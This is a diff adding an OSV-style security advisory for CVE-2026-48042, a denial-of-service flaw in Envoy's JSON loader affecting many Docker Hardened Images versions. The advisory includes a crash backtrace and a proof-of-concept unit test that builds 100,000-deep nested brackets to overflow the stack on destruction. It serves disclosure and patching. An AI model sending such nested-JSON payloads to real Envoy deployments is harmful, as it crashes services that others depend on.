@@ -1,0 +1,173 @@
+{
+  "schema_version": "1.8.0",
+  "id": "DHI-3fjg-dlf7-fo2v-vyeu",
+  "modified": "2026-09-21T12:25:57Z",
+  "published": "2026-09-21T12:25:57Z",
+  "upstream": [
+    "CVE-2026-48042"
+  ],
+  "summary": "### Summary",
+  "details": "### Summary\r\nDestructor of JSON `Object` results in stack overflow when deeply O(100K) nested objects are present.\r\n\r\n### Details\r\nConstruction of deeply nested JSON from a string succeeds via [loadFromString](https://github.com/envoyproxy/envoy/blob/099a9d71ebfd8aa9f823e1738b34138cb634a07b/source/common/json/json_loader.h#L21) but then is guaranteed to create a stack overflow due to destructor recursion:\r\n\r\n```\r\n[ RUN      ] JsonLoaderTest.DeeplyNestedJsonDestructorStackOverflow\r\n[2026-04-29 13:46:21.536][16][critical][backtrace] [./source/server/backtrace.h:129] Caught Segmentation fault, suspect faulting address 0x7ffe3c8cdff8\r\n[2026-04-29 13:46:21.536][16][critical][backtrace] [./source/server/backtrace.h:113] Backtrace (use tools/stack_decode.py to get line numbers):\r\n[2026-04-29 13:46:21.536][16][critical][backtrace] [./source/server/backtrace.h:114] Envoy version: 0/1.39.0-dev/test/DEBUG/BoringSSL\r\n[2026-04-29 13:46:21.542][16][critical][backtrace] [./source/server/backtrace.h:121] #0: Envoy::SignalAction::sigHandler() [0x55890f07ce7c]\r\n[2026-04-29 13:46:21.542][16][critical][backtrace] [./source/server/backtrace.h:123] #1: [0x7f3a3a8f0df0]\r\n[2026-04-29 13:46:21.547][16][critical][backtrace] [./source/server/backtrace.h:121] #2: Envoy::Json::Nlohmann::(anonymous namespace)::Field::~Field() [0x55890ef82a5b]\r\n[2026-04-29 13:46:21.552][16][critical][backtrace] [./source/server/backtrace.h:121] #3: Envoy::Json::Nlohmann::(anonymous namespace)::Field::~Field() [0x55890ef82a89]\r\n...\r\n[2026-04-29 13:46:21.614][16][critical][backtrace] [./source/server/backtrace.h:121] #16: Envoy::Json::Nlohmann::(anonymous namespace)::Field::~Field() [0x55890ef82a5b]\r\n[2026-04-29 13:46:21.614][16][critical][backtrace] [./source/server/backtrace.h:121] #17: Envoy::Json::Nlohmann::(anonymous namespace)::Field::~Field() [0x55890ef82a89]\r\n```\r\n\r\n### PoC\r\nUnit test reproducing the above stacktrace in test/common/json\r\n\r\n```\r\nTEST_F(JsonLoaderTest, DeeplyNestedJsonDestructorStackOverflow) {\r\n  // Construct a deeply nested JSON string.\r\n  // ~100-200KB of [[[...]]] is reported to cause a crash.\r\n  // Let's use 100,000 nesting levels to be safe.\r\n  const int depth = 100000;\r\n  std::string json;\r\n  json.reserve(depth * 2 + 10);\r\n  for (int i = 0; i < depth; ++i) {\r\n    json.push_back('[');\r\n  }\r\n  for (int i = 0; i < depth; ++i) {\r\n    json.push_back(']');\r\n  }\r\n  // Parse the JSON string.\r\n  // The parser itself is claimed to be iterative, so it should succeed.\r\n  // The crash happens during destruction of the resulting object graph.\r\n  {\r\n    auto status_or_object = Factory::loadFromString(json);\r\n    EXPECT_TRUE(status_or_object.ok());\r\n  } // Object goes out of scope here, triggering destruction and expected crash.\r\n}\r\n```\r\n\r\n### Impact\r\nAny filter using the loadFromString method on the hot path is affected. This includes but is not limited to:\r\nMcpRouter\r\nJsonToMetadata filter.\r\n\r\nNote that impact can be mitigated by setting lower buffer limits, thereby not allowing `'['*100K + ']'*100K`. \r\n\r\n### Gen AI Usage\r\nThis vulnerability was discovered by Claude Mythos and reproduced by Gemini.\r\n",
+  "severity": [
+    {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+    }
+  ],
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images",
+        "name": "envoy",
+        "purl": "pkg:docker/dhi/envoy?os_name=debian&os_version=12"
+      },
+      "versions": [
+        "1.31.10-debian12",
+        "1.31.8-debian12",
+        "1.31.9-debian12",
+        "1.32.10-debian12",
+        "1.32.6-debian12",
+        "1.32.7-debian12",
+        "1.32.8-debian12",
+        "1.32.9-debian12",
+        "1.33.3-debian12",
+        "1.33.4-debian12",
+        "1.33.5-debian12",
+        "1.33.6-debian12",
+        "1.33.7-debian12",
+        "1.34.1-debian12",
+        "1.34.2-debian12",
+        "1.34.3-debian12",
+        "1.34.4-debian12",
+        "1.34.5-debian12"
+      ],
+      "database_specific": {
+        "owner_kind": "IMAGE"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images",
+        "name": "envoy",
+        "purl": "pkg:docker/dhi/envoy?os_name=debian&os_version=13"
+      },
+      "versions": [
+        "1.31.10-debian13",
+        "1.32.10-debian13",
+        "1.32.11-debian13",
+        "1.32.12-debian13",
+        "1.32.13-debian13",
+        "1.33.10-debian13",
+        "1.33.11-debian13",
+        "1.33.12-debian13",
+        "1.33.13-debian13",
+        "1.33.14-debian13",
+        "1.33.14-debian13-dev",
+        "1.33.7-debian13",
+        "1.33.8-debian13",
+        "1.33.9-debian13",
+        "1.34.10-debian13",
+        "1.34.11-debian13",
+        "1.34.12-debian13",
+        "1.34.12-debian13-dev",
+        "1.34.13-debian13",
+        "1.34.13-debian13-dev",
+        "1.34.14-debian13",
+        "1.34.14-debian13-dev",
+        "1.34.5-debian13",
+        "1.34.6-debian13",
+        "1.34.7-debian13",
+        "1.34.8-debian13",
+        "1.34.9-debian13",
+        "1.35.10-debian13",
+        "1.35.10-debian13-dev",
+        "1.35.10-debian13-fips",
+        "1.35.10-debian13-fips-dev",
+        "1.35.11-debian13",
+        "1.35.11-debian13-dev",
+        "1.35.11-debian13-fips",
+        "1.35.11-debian13-fips-dev",
+        "1.35.12-debian13",
+        "1.35.12-debian13-dev",
+        "1.35.12-debian13-fips",
+        "1.35.12-debian13-fips-dev",
+        "1.35.2-debian13",
+        "1.35.3-debian13",
+        "1.35.4-debian13",
+        "1.35.5-debian13",
+        "1.35.6-debian13",
+        "1.35.7-debian13",
+        "1.35.8-debian13",
+        "1.35.8-debian13-dev",
+        "1.35.9-debian13",
+        "1.35.9-debian13-dev",
+        "1.36.2-debian13",
+        "1.36.4-debian13",
+        "1.36.4-debian13-dev",
+        "1.36.5-debian13",
+        "1.36.5-debian13-dev",
+        "1.36.6-debian13",
+        "1.36.6-debian13-dev",
+        "1.36.6-debian13-fips",
+        "1.36.6-debian13-fips-dev",
+        "1.36.7-debian13",
+        "1.36.7-debian13-dev",
+        "1.36.7-debian13-fips",
+        "1.36.7-debian13-fips-dev",
+        "1.36.8-debian13",
+        "1.36.8-debian13-dev",
+        "1.36.8-debian13-fips",
+        "1.36.8-debian13-fips-dev",
+        "1.37.0-debian13",
+        "1.37.0-debian13-dev",
+        "1.37.1-debian13",
+        "1.37.1-debian13-dev",
+        "1.37.2-debian13",
+        "1.37.2-debian13-dev",
+        "1.37.2-debian13-fips",
+        "1.37.2-debian13-fips-dev",
+        "1.37.3-debian13",
+        "1.37.3-debian13-dev",
+        "1.37.3-debian13-fips",
+        "1.37.3-debian13-fips-dev",
+        "1.37.4-debian13",
+        "1.37.4-debian13-dev",
+        "1.37.4-debian13-fips",
+        "1.37.4-debian13-fips-dev",
+        "1.38.0-debian13",
+        "1.38.0-debian13-dev",
+        "1.38.0-debian13-fips",
+        "1.38.0-debian13-fips-dev",
+        "1.38.1-debian13",
+        "1.38.1-debian13-dev",
+        "1.38.1-debian13-fips",
+        "1.38.1-debian13-fips-dev",
+        "1.38.2-debian13",
+        "1.38.2-debian13-dev",
+        "1.38.2-debian13-fips",
+        "1.38.2-debian13-fips-dev"
+      ],
+      "database_specific": {
+        "owner_kind": "IMAGE"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "ADVISORY",
+      "url": "https://scout.docker.com/v/DHI-3fjg-dlf7-fo2v-vyeu"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://github.com/envoyproxy/envoy/security/advisories/GHSA-f24p-rxw2-g6pv"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-48042"
+    },
+    {
+      "type": "FIX",
+      "url": "https://github.com/envoyproxy/envoy/blob/099a9d71ebfd8aa9f823e1738b34138cb634a07b/source/common/json/json_loader.h#L21"
+    }
+  ]
+}
